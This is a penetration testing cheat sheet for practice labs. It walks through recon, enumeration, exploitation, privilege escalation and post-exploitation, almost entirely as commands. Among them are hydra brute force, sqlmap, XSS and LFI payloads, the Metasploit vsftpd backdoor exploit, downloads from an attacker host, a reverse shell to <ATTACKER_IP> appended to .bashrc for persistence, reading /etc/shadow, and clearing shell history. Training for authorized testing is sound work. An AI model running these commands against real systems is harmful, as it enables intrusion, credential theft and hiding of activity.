🛡️ Penetration Testing Workflow
A structured guide covering the complete penetration testing lifecycle: Reconnaissance, Enumeration, Exploitation, Privilege Escalation, and Post-Exploitation.

📍 PHASE 1: Reconnaissance (Know the Terrain)
🔍 Discover Live Hosts
bash
Copy
Edit
arp-scan -l
🧠 Identify Host OS
bash
Copy
Edit
nmap -O <IP>
🌐 DNS & WHOIS (for domains)
bash
Copy
Edit
dig example.com
whois example.com
nslookup example.com
Note: These tools work for domain names, not IP addresses.

⚙️ Active Recon (Port Scanning)
🔄 Full Port Scan
bash
Copy
Edit
nmap -p- -T4 <IP>
📡 Service Version Detection + Scripts
bash
Copy
Edit
nmap -sV -sC -O <IP>
💾 Save Scan Results
bash
Copy
Edit
nmap -sV -oA scan <IP>
📍 PHASE 2: Enumeration (Know the Weakness)
🌐 HTTP (Ports 80/8080/Other)
Manual Browsing:
http://<IP>

🔧 Tools
bash
Copy
Edit
whatweb http://<IP>
nikto -h http://<IP>
dirb http://<IP>
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
🔎 Vulnerability Scanning
bash
Copy
Edit
wapiti http://<IP>
📁 FTP (Port 21)
Anonymous Access
bash
Copy
Edit
ftp <IP>
Enumeration
bash
Copy
Edit
nmap --script ftp-anon,ftp-bounce -p21 <IP>
Brute Force
bash
Copy
Edit
hydra -l user -P rockyou.txt ftp://<IP>
🔐 SSH (Port 22)
Version Detection
bash
Copy
Edit
nmap -sV -p22 <IP>
Brute Force
bash
Copy
Edit
hydra -l root -P rockyou.txt ssh://<IP>
Try default credentials: admin:admin, root:toor, etc.

📦 SMB (Port 445)
List Shares
bash
Copy
Edit
smbclient -L //<IP>
Access Share
bash
Copy
Edit
smbclient //<IP>/sharename
Enumeration Tools
bash
Copy
Edit
enum4linux-ng <IP>
nmap --script smb-enum-shares,smb-enum-users -p445 <IP>
🔄 Other Common Services
Service	Port	Command
MySQL	3306	mysql -u root -h <IP> -p
Telnet	23	telnet <IP>
RDP	3389	xfreerdp /u:USERNAME /p:PASSWORD /v:<IP>

📍 PHASE 3: Exploitation (Break the System)
If no vulnerable services are found, use what you’ve learned for future targets.

🌐 Web Exploits
SQL Injection
bash
Copy
Edit
sqlmap -u "http://<IP>/vuln.php?id=1" --dbs
File Upload / LFI / XSS
plaintext
Copy
Edit
XSS: <script>alert(1)</script>
LFI: http://<IP>/index.php?page=../../../../etc/passwd
🧨 Metasploit
bash
Copy
Edit
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <IP>
run
📚 Exploit DB / Searchsploit
bash
Copy
Edit
searchsploit <service_name> <version>
Download exploits to target:

bash
Copy
Edit
wget http://<ATTACKER_IP>/exploit.sh
📍 PHASE 4: Privilege Escalation (Become Root)
🔍 Linux Enumeration Scripts
bash
Copy
Edit
wget http://<IP>/linpeas.sh && bash linpeas.sh
# or
wget http://<IP>/LinEnum.sh && bash LinEnum.sh
🔍 Manual Checks
SUID binaries

Writable /etc/passwd

Cronjobs

Kernel vulnerabilities

Kernel Exploit Suggestion
bash
Copy
Edit
linux-exploit-suggester.sh
📍 PHASE 5: Post-Exploitation
🧾 Read Sensitive Data
bash
Copy
Edit
cat /home/*/.bash_history
cat /etc/shadow
🧬 Persistence
bash
Copy
Edit
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' >> ~/.bashrc
🧹 Cover Tracks
bash
Copy
Edit
history -c
rm ~/.bash_history
⚙️ Tools to Master
Category	Tools
Port Scanning	nmap, masscan
Web Analysis	nikto, dirb, gobuster, whatweb, sqlmap
Enumeration	enum4linux-ng, smbclient, ftp, hydra, ldapsearch
Exploitation	msfconsole, searchsploit, exploit-db, custom scripts
Privilege Escalation	linpeas.sh, LinEnum.sh, linux-exploit-suggester.sh
Post-Exploitation	netcat, socat, cronjobs, backdoors

🎯 Extra Practice Tasks
Set up a local vulnerable lab:

Vulhub

Metasploitable

TryHackMe

Hack The Box

Simulate Real-World Attacks:

MitM: ettercap

Sniffing: tcpdump, wireshark

Brute Force: RDP/SSH via hydra

Build Full Attack Chains using the MITRE ATT&CK framework.

💡 Practice consistently, document your learning, and build intuition with every test box